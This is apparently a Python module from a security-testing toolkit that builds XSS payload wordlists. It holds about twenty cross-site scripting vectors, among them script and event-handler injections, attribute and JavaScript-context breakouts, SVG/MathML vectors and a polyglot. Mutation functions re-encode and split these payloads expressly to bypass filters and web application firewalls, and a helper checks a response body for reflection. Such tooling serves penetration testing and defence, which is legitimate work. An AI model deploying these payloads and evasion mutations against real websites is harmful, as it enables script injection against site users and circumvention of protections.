"""
XSS payload generator & mutator.

Generates a curated set of XSS payloads, then runs them through a set of
*mutations* (encoding, case variation, tag breakups) to bypass common
filters/WAFs. Useful for building payload wordlists and for automated
reflection testing.

This is a generator, not an attacker — it does not send requests.
"""
from __future__ import annotations
import html
import random
import urllib.parse
from typing import List, Iterable


# Curated base payloads covering contexts: html, attribute, js, url
BASE_PAYLOADS = [
    # Classic
    "<script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    # Attribute breakout
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    "\" autofocus onfocus=alert(1) x=\"",
    # JS context
    "';alert(1)//",
    "\";alert(1)//",
    "-alert(1)//",
    "javascript:alert(1)",
    # SVG / mathy vectors
    "<svg><animate onbegin=alert(1) attributeName=x>",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    # Polyglot (works in many contexts)
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    # Event handlers that survive attribute filters
    "\" onpointerover=alert(1) x=\"",
    "\" ontoggle=alert(1) open x=\"",
    "<details open ontoggle=alert(1)>",
    # No-angle-bracket vectors (for filtered < >)
    "\"onmouseover=alert(1) x=\"",
    "xss\"+alert(1)+\"",
]

# Mutation strategies
def _url_encode(p: str) -> str:
    return urllib.parse.quote(p, safe="")

def _double_url_encode(p: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")

def _html_entity_encode(p: str) -> str:
    return html.escape(p)

def _unicode_escape(p: str) -> str:
    return "".join(f"\\u{ord(c):04x}" for c in p)

def _case_random(p: str) -> str:
    return "".join(c.swapcase() if random.random() > 0.5 else c for c in p)

def _tag_breakup(p: str) -> str:
    # Insert null/newline chars inside tags to evade naive regex filters
    return p.replace("<", "<\n").replace(">", "\n>")

MUTATIONS = {
    "url": _url_encode,
    "double_url": _double_url_encode,
    "html_entity": _html_entity_encode,
    "unicode": _unicode_escape,
    "random_case": _case_random,
    "tag_breakup": _tag_breakup,
}


class XssPayloadGen:
    """Generate and mutate XSS payloads."""

    def __init__(self, payloads: Iterable[str] | None = None):
        self.payloads = list(payloads) if payloads is not None else list(BASE_PAYLOADS)

    def base(self) -> List[str]:
        """Return the curated base payload set."""
        return list(self.payloads)

    def mutate(self, payload: str, strategy: str = "all") -> List[str]:
        """Apply mutation strategies to a single payload."""
        out: List[str] = []
        if strategy == "all":
            strategies = list(MUTATIONS.keys())
        else:
            strategies = [strategy]
        for s in strategies:
            fn = MUTATIONS.get(s)
            if fn:
                try:
                    out.append(fn(payload))
                except Exception:
                    continue
        return out

    def generate(self, mutate: bool = True, max_count: int = 0) -> List[str]:
        """
        Generate the full payload wordlist.

        :param mutate: include mutated variants
        :param max_count: cap total output (0 = unlimited)
        """
        results: List[str] = []
        for p in self.payloads:
            results.append(p)
            if mutate:
                results.extend(self.mutate(p))
        # dedupe preserving order
        seen, dedup = set(), []
        for p in results:
            if p not in seen:
                seen.add(p)
                dedup.append(p)
        return dedup if not max_count else dedup[:max_count]

    def check_reflection(self, response_text: str, payload: str) -> bool:
        """
        Naively check whether ``payload`` appears (unencoded) in a response body.
        Also checks the URL-decoded form, since reflection often arrives decoded.
        """
        if payload in response_text:
            return True
        decoded = urllib.parse.unquote(response_text)
        return payload in decoded
